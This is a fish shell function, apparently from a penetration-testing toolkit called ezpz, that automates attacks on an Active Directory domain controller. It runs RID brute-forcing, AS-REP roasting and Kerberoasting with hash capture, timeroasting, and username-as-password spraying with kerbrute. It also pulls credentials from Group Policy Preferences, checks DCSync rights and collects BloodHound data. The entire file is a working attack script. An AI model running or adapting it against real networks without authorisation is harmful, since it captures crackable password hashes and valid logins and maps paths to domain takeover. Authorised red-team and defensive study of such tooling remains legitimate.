function _ezpz_enumdomain
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    # ASCII banner
    echo ''
    echo '                           '(set_color yellow --bold)'  _ \   _ \   \  |    \   _ _|   \ | '(set_color normal)
    echo '     -_)    \   |  |   ` \ '(set_color yellow --bold)'  |  | (   | |\/ |   _ \    |   .  | '(set_color normal)
    echo '   \___| _| _| \_,_| _|_|_|'(set_color yellow --bold)' ___/ \___/ _|  _| _/  _\ ___| _|\_| '(set_color normal)
    echo ''

    # Usage message
    set usage "
Usage: ezpz enumdomain -t <target> -u <user> -d <domain> [options]
  Enumerates an Active Directory domain for users, groups, policies, and misconfigurations.

  -t, --target        Target Domain Controller IP or hostname (Required)
  -u, --user          Username for authentication (Required)  
  -d, --domain        Domain name (Required)
  -p, --password      Password for authentication
  -H, --hash          NTLM hash for pass-the-hash authentication
  -k, --kerb          Use Kerberos authentication (requires a valid TGT)
  --target-domain     Target domain (when different from credential domain)

Examples:
  ezpz enumdomain -t 10.10.10.10 -u administrator -p password123 -d corp.local
  ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local --target-domain dev.local
"

    # Check required tools
    set required_tools nxc GetNPUsers.py GetUserSPNs.py findDelegation.py
    for tool in $required_tools
        if not command -v $tool >/dev/null 2>&1
            ezpz_error "Required tool not found: $tool"
            return 1
        end
    end

    # Parse arguments
    argparse 't/target=' 'u/user=' 'd/domain=' 'p/password=' 'H/hash=' 'k/kerb' 'target-domain=' 'h/help' -- $argv
    or begin
        ezpz_error "Invalid arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 1
    end

    # Check required arguments
    if not set -q _flag_target
        ezpz_error "Missing required argument: -t/--target"
        echo $usage
        return 1
    end

    if not set -q _flag_user
        ezpz_error "Missing required argument: -u/--user"
        echo $usage
        return 1
    end

    if not set -q _flag_domain
        ezpz_error "Missing required argument: -d/--domain"
        echo $usage
        return 1
    end

    # Set variables
    set target $_flag_target
    set user $_flag_user
    set domain $_flag_domain
    set target_domain $_flag_target_domain

    # Determine which domain to use for file naming
    set file_domain $domain
    if set -q _flag_target_domain
        set file_domain $_flag_target_domain
    end

    # Extract DC FQDN from /etc/hosts if needed for Kerberos
    set dc_fqdn ""
    set dc_fqdn (awk -v target="$target" '$1 == target {max_len=0; fqdn=""; for(i=2; i<=NF; i++) {if(length($i) > max_len) {max_len=length($i); fqdn=$i}} print fqdn; exit}' /etc/hosts)
    if test -z "$dc_fqdn" -a -n "$_flag_kerb"
        ezpz_warn "DC FQDN not found in /etc/hosts for $target. Kerberos may fail."
    end

    # Build nxc authentication arguments (domain\user format)
    set nxc_auth $target -u "$domain\\$user"
    
    # Build impacket authentication arguments (domain/user format)
    set imp_auth "$domain/$user"

    # Add authentication method
    if set -q _flag_password
        set -a nxc_auth -p "$_flag_password"
        set imp_auth "$imp_auth:$_flag_password"
    else if set -q _flag_hash
        set -a nxc_auth -H "$_flag_hash"
        set -a imp_auth -hashes ":$_flag_hash"
    end

    
    if set -q _flag_kerb
        set -a nxc_auth -k
        set -a imp_auth -k
        if set -q KRB5CCNAME
            set -a nxc_auth --use-kcache
            ezpz_cmd "Using KRB5CCNAME at $KRB5CCNAME"
        end
        
               
        if test -n "$dc_fqdn"
            # Change IP to FQDN
            set nxc_auth[1] $dc_fqdn
            set -a imp_auth -dc-host $dc_fqdn
            # Create IP-only version for commands that require IP (like --dc-list)
            set nxc_auth_ip $nxc_auth
            set nxc_auth_ip[1] $target
        end
            
        
        # Time synchronization for Kerberos
        if command -v ntpdate >/dev/null 2>&1
            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
            sudo ntpdate -u $target >/dev/null 2>&1
        else
            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
        end
    end

    # Add DC IP for impacket commands
    set -a imp_auth -dc-ip $target

    # Build bloodyAD authentication
    if command -v bloodyAD >/dev/null 2>&1
        if set -q _flag_kerb
            set bloody_auth --host $dc_fqdn -dc-ip $target -d $domain -u $user
        else
            set bloody_auth --host $target -d $domain -u $user
        end
        
        if set -q _flag_password
            set -a bloody_auth -p "$_flag_password"
        else if set -q _flag_hash
            set -a bloody_auth -p ":$_flag_hash"
        end
        
        if set -q _flag_kerb
            if set -q KRB5CCNAME
                set -a bloody_auth -k "ccache=$KRB5CCNAME"
            else
                set -a bloody_auth -k
            end
        end
    end

    # Create temporary file for users
    set users_tmp (mktemp)
    trap 'rm -f "$users_tmp"' EXIT TERM

    ezpz_title "Starting user & group enumeration..."

    # User Enumeration - check if users file already exists
    set users_file "$file_domain"_users.txt
    set users_file_mini "$file_domain"_users-mini.txt
    if test -f $users_file
        ezpz_info "Users file $users_file already exists. Skipping user enumeration."
        cat $users_file
        cp $users_file $users_tmp
    else
        # Create temporary file for users display
        set users_temp (mktemp)
        
        # Prioritize --rid-brute over --users
        ezpz_header "Enumerating users with RID Bruteforcing"
        ezpz_cmd "nxc smb $nxc_auth --rid-brute 10000"
        nxc smb $nxc_auth --rid-brute 10000 2>/dev/null | grep 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
        
        if test $pipestatus[1] -eq 124
            ezpz_warn "Operation timed out. Skipping."
        else if test -s $users_tmp
            cp $users_tmp $users_file
            ezpz_info "Saving enumerated users to $users_file"
        else
            ezpz_warn "No users found with --rid-brute. Trying --users as fallback..."
            if test -f $users_file_mini
                ezpz_info "Users file $users_file already exists. Skipping user enumeration."
                cat $users_file_mini
                cp $users_file_mini $users_tmp
            else    
                # Fallback to --users
                ezpz_header "Enumerating users (fallback)"
                ezpz_cmd "nxc smb $nxc_auth --users"
                nxc smb $nxc_auth --users 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
                
                if test $pipestatus[1] -eq 124
                    ezpz_warn "Operation timed out. Skipping."
                else if test -s $users_temp
                    # Extract just usernames and save to file with -mini suffix
                    cat $users_temp | awk '{print $1}' > $users_tmp
                    cp $users_tmp $users_file_mini
                    ezpz_info "Saving enumerated users to $users_file_mini"
                    set users_file $users_file_mini
                else
                    ezpz_error "No users found with --users fallback."
                end
            end
        end
        
        # Cleanup temp file
        rm -f $users_temp
    end

    ezpz_header "Enumerating groups"
    ezpz_cmd "nxc ldap $nxc_auth --groups"
    nxc ldap $nxc_auth --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"

    ezpz_header "Enumerating privileged users"
    ezpz_cmd "nxc ldap $nxc_auth --admin-count"
    nxc ldap $nxc_auth --admin-count 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5

    ezpz_header "Enumerating user descriptions"
    ezpz_cmd "nxc ldap $nxc_auth -M get-desc-users"
    nxc ldap $nxc_auth -M get-desc-users 2>/dev/null | grep --color=never -o "User:.*" | awk -F'description: ' '{user=$1; sub(/^User: /, "", user); print user " ||| " $2}' | column -s '|||' -t

    ezpz_title "Looking for exploitable accounts..."

    ezpz_header "Searching for AS-REProastable accounts"
    set asrep_file "$file_domain"_asrep.hash
    if set -q _flag_target_domain
        ezpz_cmd "GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file -request"
        if test -f $users_file
            GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file -outputfile $asrep_file | grep -iE "(No entries found|Error)"
        else
            ezpz_warn "Users file $users_file not found. Skipping cross-domain AS-REP roasting with usersfile."
        end
    else
        ezpz_cmd "GetNPUsers.py $imp_auth -request"
        GetNPUsers.py $imp_auth -request -outputfile $asrep_file | grep -iE "(No entries found|Error)"
    end

    if test -f $asrep_file
        cat $asrep_file
        ezpz_info "Saving hashes to $asrep_file"
    end

    ezpz_header "Searching for Kerberoastable accounts"
    set kerb_file "$file_domain"_kerb.hash
    if set -q _flag_target_domain
        ezpz_cmd "GetUserSPNs.py $imp_auth -target-domain $_flag_target_domain -request"
        GetUserSPNs.py $imp_auth -target-domain $_flag_target_domain -request -outputfile $kerb_file | grep -iE "(No entries found|Error)"
    else
        ezpz_cmd "GetUserSPNs.py $imp_auth -request"
        GetUserSPNs.py $imp_auth -request -outputfile $kerb_file | grep -iE "(No entries found|Error)"
    end
    if test -f $kerb_file
        # Convert hashes to user:hash format and save to a temporary file
        set kerb_formatted (mktemp)
        cat $kerb_file | sed -E 's/\$krb5tgs\$23\$\*([^$]+)\$.*$/\1:&/' > $kerb_formatted
        cat $kerb_formatted
        mv $kerb_formatted $kerb_file
        ezpz_info "Saving hashes to $kerb_file"
    end

    ezpz_header "Searching for Timeroastable accounts"
    set time_file "$file_domain"_time.hash
    ezpz_cmd "smb $nxc_auth -M timeroast"
    nxc smb $nxc_auth -M timeroast 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
    if test -f $time_file
        ezpz_info "Saving hashes to $time_file"
    end

    ezpz_header "Searching for accounts with PASSWD_NOTREQD flag"
    ezpz_cmd "nxc ldap $nxc_auth --password-not-required"
    nxc ldap $nxc_auth --password-not-required 2>/dev/null | grep --color=never -ao "User:.*"

    ezpz_header "Enumerating Group Managed Service Accounts (gMSA)"
    ezpz_cmd "nxc ldap $nxc_auth --gmsa"
    timeout 60 nxc ldap $nxc_auth --gmsa 2>/dev/null | grep -aoE "Account:.*|PrincipalsAllowedToReadPassword:.*" --color=never
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    if test -s $users_tmp
        if command -v pre2k >/dev/null 2>&1
            ezpz_header "Searching for pre-Win2k compatible computer accounts (NoPac)"
            
            # Build pre2k auth command
            set pre2k_cmd pre2k auth -u "$user" -d $domain -dc-ip $target
            
            # Add authentication method
            if set -q _flag_password
                set -a pre2k_cmd -p "$_flag_password"
            else if set -q _flag_hash
                set -a pre2k_cmd -hashes ":$_flag_hash"
            else if set -q _flag_kerb
                set -a pre2k_cmd -k
                if set -q KRB5CCNAME
                    set -a pre2k_cmd -no-pass
                end
            end
            
            ezpz_cmd "$pre2k_cmd"
            $pre2k_cmd 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
        else
            ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
        end
    end

    if command -v kerbrute >/dev/null 2>&1
        ezpz_header "Bruteforcing credentials with username as password"
        if test -s $users_tmp
            ezpz_cmd "kerbrute passwordspray --dc $domain -d $domain $users_tmp --user-as-pass"
            kerbrute passwordspray --dc $domain -d $domain $users_tmp --user-as-pass | grep -oE "VALID LOGIN.*"
        else
            ezpz_error "User list is empty. Run RID bruteforce first. Skipping."
        end
    else
        ezpz_warn "Kerbrute not found. Skipping username-as-password bruteforce."
    end

    ezpz_title "Looking for interesting domain configuration and services..."

    ezpz_header "Searching for PKI Enrollment Services (ADCS)"
    ezpz_cmd "nxc ldap $nxc_auth -M adcs"
    nxc ldap $nxc_auth -M adcs 2>/dev/null | grep 'ADCS' | tr -s " " | cut -d ' ' -f 6-

    ezpz_header "Searching for trust relationships"
    if set -q nxc_auth_ip
        ezpz_cmd "nxc ldap $nxc_auth_ip --dc-list"
        nxc ldap $nxc_auth_ip --dc-list 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5-
    else
        ezpz_cmd "nxc ldap $nxc_auth --dc-list"
        nxc ldap $nxc_auth --dc-list 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5-
    end

    ezpz_header "Enumerating MachineAccountQuota (MAQ)"
    ezpz_cmd "nxc ldap $nxc_auth -M maq"
    nxc ldap $nxc_auth -M maq 2>/dev/null | grep -oE "MachineAccountQuota: .*" --color=never

    ezpz_header "Enumerating delegation rights"
    if set -q _flag_target_domain
        ezpz_cmd "findDelegation.py $imp_auth -target-domain $_flag_target_domain"
    else
        ezpz_cmd "findDelegation.py $imp_auth"
    end
    set output (findDelegation.py $imp_auth 2>&1)
    set error_lines (string split '\n' $output | grep -iE "(No entries found|Error)")
    if test -n "$error_lines"
        for line in $error_lines
            echo $line | sed 's/^\[\-\] //'
        end
    else
        echo $output | grep --color=never "\\S" | tail -n +2
    end

    ezpz_header "Enumerating DCSync rights"
    # Build TARGET_DN dynamically based on domain parts
    set domain_parts (string split '.' $domain)
    set target_dn ""
    for part in $domain_parts
        if test -n "$target_dn"
            set target_dn "$target_dn,DC=$part"
        else
            set target_dn "DC=$part"
        end
    end
    ezpz_cmd "nxc ldap $nxc_auth -M daclread -o TARGET_DN=\"$target_dn\" ACTION=read RIGHTS=DCSync"
    nxc ldap $nxc_auth -M daclread -o TARGET_DN="$target_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'

    ezpz_header "Searching for credentials in Group Policy Preferences (GPP)"
    ezpz_cmd "nxc smb $nxc_auth -M gpp_password -M gpp_autologin"
    nxc smb $nxc_auth -M gpp_password 2>/dev/null | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
    nxc smb $nxc_auth -M gpp_autologin 2>/dev/null | grep -aioE "Found credentials .*|Usernames: .*|Passwords: .*" --color=never

    ezpz_title "DNS enumeration..."

    # DNS Dump using bloodyAD
    if command -v bloodyAD >/dev/null 2>&1
        ezpz_header "Enumerating DNS records"
        ezpz_cmd "bloodyAD $bloody_auth get dnsDump"
        timeout 60 bloodyAD $bloody_auth get dnsDump 2>/dev/null | awk '
        {
            if (/^recordName:/) {
                current_record = $2
            } else if (/^A:/ && current_record != "") {
                gsub(/^A: /, "", $0)
                gsub(/; /, ", ", $0)
                print current_record " -> " $0
                current_record = ""
            } else if (/^$/) {
                current_record = ""
            }
        }' | sort | uniq | awk '
        BEGIN { 
            printf "%-35s %s\n", "HOSTNAME", "IP ADDRESS(ES)"
            printf "%-35s %s\n", "--------", "-------------"
        }
        {
            split($0, parts, " -> ")
            printf "%-35s %s\n", parts[1], parts[2]
        }'
        
        if test $pipestatus[1] -eq 124
            ezpz_warn "Operation timed out. Skipping."
        end
    else
        ezpz_warn "bloodyAD not found. Skipping DNS enumeration."
    end

    ezpz_title "Starting data collection..."

    ezpz_header "Ingesting AD data for BloodHound"
    ezpz_cmd "nxc ldap $nxc_auth --bloodhound --collection All --dns-server $target"
    set zip_path (nxc ldap $nxc_auth --bloodhound --collection All --dns-server $target 2>/dev/null | grep -oE '/[^ ]+_bloodhound\.zip' | tail -1)
    if test -n "$zip_path" -a -f "$zip_path"
        set dest_zip "./$file_domain"_bloodhound.zip
        mv $zip_path $dest_zip
        ezpz_info "Saving data to $dest_zip"
        
        # Remove JSON files created in the last minute (BloodHound artifacts)
        find . -maxdepth 1 -name "*.json" -mmin -1 -delete 2>/dev/null
        # Also remove any files matching BloodHound naming pattern
        find . -maxdepth 1 -name "*_*_*_*_*.json" -delete 2>/dev/null
    else
        ezpz_error "Could not find BloodHound zip output!"
    end

    ezpz_success "Done."
end